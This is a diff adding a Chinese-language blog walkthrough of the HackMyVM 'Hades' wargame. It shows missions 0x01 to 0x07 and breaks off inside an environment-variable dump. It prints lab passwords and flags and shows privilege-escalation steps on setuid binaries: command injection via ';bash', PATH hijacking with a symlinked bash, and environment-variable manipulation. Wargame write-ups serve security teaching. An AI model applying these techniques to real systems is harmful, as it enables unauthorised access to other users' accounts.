@@ -15080,4 +15080,1181 @@ root@hundred:/home/hmv<span class="token comment"># id</span>
         <tag>/etc/shadow</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackMyVM-Hades</title>
+    <url>/posts/13a562a7/</url>
+    <content><![CDATA[<h2 id="MISSION-0x01"><a href="#MISSION-0x01" class="headerlink" title="MISSION 0x01"></a>MISSION 0x01</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x01 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User acantha has left us a gift to obtain her powers.
+
+<span class="token comment">## ES ##</span>
+La usuaria acantha nos ha dejado un regalo para obtener sus poderes.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> *gift* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/usr/share/man/man1/giftopnm.1.gz
+/usr/bin/giftopnm
+/opt/gift_hacker</code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFsiU.png" alt="OPFsiU.png" loading="lazy"><br>直接执行就完事了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ /opt/gift_hacker 
+acantha@hades:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span>
+acantha@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">32</span>
+drwxr-x--- <span class="token number">2</span> root   hacker <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> hacker hacker <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-rw-r----- <span class="token number">1</span> root   hacker  <span class="token number">194</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rw-r----- <span class="token number">1</span> root   hacker <span class="token number">2625</span> Apr  <span class="token number">5</span> 06:36 readme.txt
+acantha@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> acant* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/pwned/acantha
+/pazz/acantha_pass.txt
+acantha@hades:~$ <span class="token function">cat</span> /pazz/acantha_pass.txt 
+mYYLhLBSkrzZqFydxGkn</code></pre>
+<p>ssh登录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span>
+acantha@hades:~$ <span class="token function">ls</span> 
+flagz.txt  guess  mission.txt
+acantha@hades:~$ <span class="token function">cat</span> flagz.txt 
+^CaEuVJtJjaCwZtuuAFD^</code></pre>
+<h2 id="MISSSION-0x02"><a href="#MISSSION-0x02" class="headerlink" title="MISSSION 0x02"></a>MISSSION 0x02</h2><pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x02 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user alala has left us a program, <span class="token keyword">if</span> we insert the <span class="token number">6</span> correct numbers, she gives us her password<span class="token operator">!</span>
+
+<span class="token comment">## ES ##</span>
+La usuaria alala nos ha dejado un programa, si insertamos los <span class="token number">6</span> numeros correctos, nos da <span class="token function">su</span> password<span class="token operator">!</span></code></pre>
+<p>反编译guess<br><img src="https://ooo.0x0.ooo/2024/06/24/OPFVtY.png" alt="OPFVtY.png" loading="lazy"><br>直接拿到密码<code>DsYzpJQrCEndEWIMxWxu</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">52</span>
+drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
+-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span>
+alala@hades:~$ <span class="token function">cat</span> flagz.txt 
+^gTdGmkwhDrCqKrDQpxH^</code></pre>
+<h2 id="MISSION-0x03"><a href="#MISSION-0x03" class="headerlink" title="MISSION 0x03"></a>MISSION 0x03</h2><pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x03 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User althea loves reading Linux help.
+
+<span class="token comment">## ES ##</span>
+A la usuaria althea le encanta leer la ayuda de Linux.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">52</span>
+drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
+-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span></code></pre>
+<p>直接在底端执行命令读取 althea的密码就行了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> althea* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/pwned/alala/althea_pass.txt</code></pre>
+<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFY2v.png" alt="OPFY2v.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ ./read
+ObxEmwisYjERrDfvSbdA
+<span class="token operator">!</span>done  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span></code></pre>
+<p>拿到密码<code>ObxEmwisYjERrDfvSbdA</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> flagz.txt 
+^btDtPAPzSiXmoHItpqX^</code></pre>
+<h2 id="MISSION-0x04"><a href="#MISSION-0x04" class="headerlink" title="MISSION 0x04"></a>MISSION 0x04</h2><pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x04 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user andromeda has left us a program to list directories.
+
+<span class="token comment">## ES ##</span>
+La usuaria andromeda nos ha dejado un programa para listar directorios.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
+Enter <span class="token function">file</span> to check:
+/pwned/andromeda
+/bin/ls: cannot <span class="token function">open</span> directory <span class="token string">'/pwned/andromeda'</span><span class="token builtin class-name">:</span> Permission denied
+Segmentation fault
+althea@hades:~$ ./lsme
+Enter <span class="token function">file</span> to check:
+<span class="token punctuation">;</span><span class="token function">id</span>
+total <span class="token number">28</span>
+-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
+-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
+-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span></code></pre>
+<p>测试发现可以命令执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
+Enter <span class="token function">file</span> to check:
+
+<span class="token punctuation">;</span><span class="token function">bash</span>
+total <span class="token number">28</span>
+-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
+-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
+-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+andromeda@hades:~$ <span class="token function">cat</span> andromeda_pass.txt 
+OTWGTbHzrxhYFSTlKcOt</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">52</span>
+drwxr-x--- <span class="token number">2</span> root      andromeda  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> andromeda andromeda  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-r--r----- <span class="token number">1</span> anthea    anthea       <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 anthea_pass.txt
+-rw-r----- <span class="token number">1</span> root      andromeda    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root      andromeda   <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rwS--s--- <span class="token number">1</span> root      andromeda <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 uid
+andromeda@hades:~$ ca tfl
+-bash: ca: <span class="token builtin class-name">command</span> not found
+andromeda@hades:~$ <span class="token function">cat</span> flagz.txt 
+^xzsHGrOeNctIZLGKzWq^</code></pre>
+<h2 id="MISSION-0x05"><a href="#MISSION-0x05" class="headerlink" title="MISSION 0x05"></a>MISSION 0x05</h2><pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x05 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user anthea reminds us <span class="token function">who</span> we are.
+
+<span class="token comment">## ES ##</span>
+La usuaria anthea procura que no olvidemos quien somos.</code></pre>
+<p>软连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
+ln: failed to create symbolic <span class="token function">link</span> <span class="token string">'/tmp/id'</span><span class="token builtin class-name">:</span> File exists
+andromeda@hades:~$ <span class="token function">rm</span> /tmp/id
+andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
+andromeda@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp
+andromeda@hades:~$ ./uid
+anthea@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/bin
+anthea@hades:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span>
+anthea@hades:~$ <span class="token function">cat</span> anthea_pass.txt
+yWFLtSNQArEBTHtWgkKd</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">52</span>
+drwxr-x--- <span class="token number">2</span> root      anthea     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> anthea    anthea     <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
+-r--r----- <span class="token number">1</span> aphrodite aphrodite    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 aphrodite_pass.txt
+-rw-r----- <span class="token number">1</span> root      anthea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
+-rw-r----- <span class="token number">1</span> root      anthea      <span class="token number">175</span> Apr  <span class="token number">5</span> 06:36 mission.txt
+-rwS--s--- <span class="token number">1</span> root      anthea    <span class="token number">16256</span> Apr  <span class="token number">5</span> 06:36 obsessed
+anthea@hades:~$ <span class="token function">cat</span> flagz.txt 
+^AcFLuAjhydNKIkPoFLL^</code></pre>
+<h2 id="MISSION-0x06"><a href="#MISSION-0x06" class="headerlink" title="MISSION 0x06"></a>MISSION 0x06</h2><pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x06 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+User aphrodite is obsessed with the number <span class="token number">94</span>. 
+
+<span class="token comment">## ES ##</span>
+La usuaria aphrodite esta obsesionada con el numero <span class="token number">94</span>.</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ ./obsessed 
+No MYID ENV
+anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span><span class="token number">94</span>
+anthea@hades:~$ ./obsessed 
+Current MYID: <span class="token number">57</span>
+Incorrect MYID
+anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span>^
+anthea@hades:~$ ./obsessed
+Current MYID: <span class="token number">94</span>
+aphrodite@hades:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> aphrodite_pass.txt 
+HPJVaqRzieKQeyyATsFv
+aphrodite@hades:~$ <span class="token function">cat</span> flagz.txt 
+^fmPlsDByrwmEpRAKgeP^</code></pre>
+<h2 id="MISSION-0x07"><a href="#MISSION-0x07" class="headerlink" title="MISSION 0x07"></a>MISSION 0x07</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> mission.txt 
+<span class="token comment">################</span>
+<span class="token comment"># MISSION 0x07 #</span>
+<span class="token comment">################</span>
+
+<span class="token comment">## EN ##</span>
+The user ariadne knows what we keep <span class="token keyword">in</span> our <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span>
+
+<span class="token comment">## ES ##</span>
+La usuaria ariadne sabe que es lo que guardamos en nuestro <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ ./homecontent 
+The content of your <span class="token environment constant">HOME</span> is:
+ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
+<p>猜测执行ls+环境变量里面的home变量</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">env</span>
+<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash
+<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/pwned/aphrodite
+<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>aphrodite
+<span class="token assign-left variable">MOTD_SHOWN</span><span class="token operator">=</span>pam
+<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/pwned/aphrodite
+<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
+<span class="token assign-left variable"><span class="token environment constant">LS_COLORS</span></span><span class="token operator">=</span>rs<span class="token operator">=</span><span class="token number">0</span>:di<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">34</span>:ln<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">36</span>:mh<span class="token operator">=</span>00:pi<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span>:so<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:do<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:bd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:cd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:or<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">31</span><span class="token punctuation">;</span>01:mi<span class="token operator">=</span>00:su<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">41</span>:sg<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">43</span>:ca<span class="token operator">=</span>00:tw<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">42</span>:ow<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span><span class="token number">42</span>:st<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">44</span>:ex<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">32</span>:*.tar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arj<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.taz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lha<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzh<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzma<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tlz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.txz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.t7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zip<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.gz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lrz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.xz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.deb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.jar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.war<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ear<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.sar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.alz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ace<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zoo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cpio<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cab<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.wim<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.swm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dwm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.esd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.avif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.bmp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pgm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ppm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tga<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tiff<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.png<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mng<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pcx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mov<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m2v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mkv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.vob<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.qt<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.nuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.wmv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.asf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rmvb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.avi<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.fli<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.dl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xcf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xwd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.yuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.cgm<span class="token operator">=</span>01<span class="token 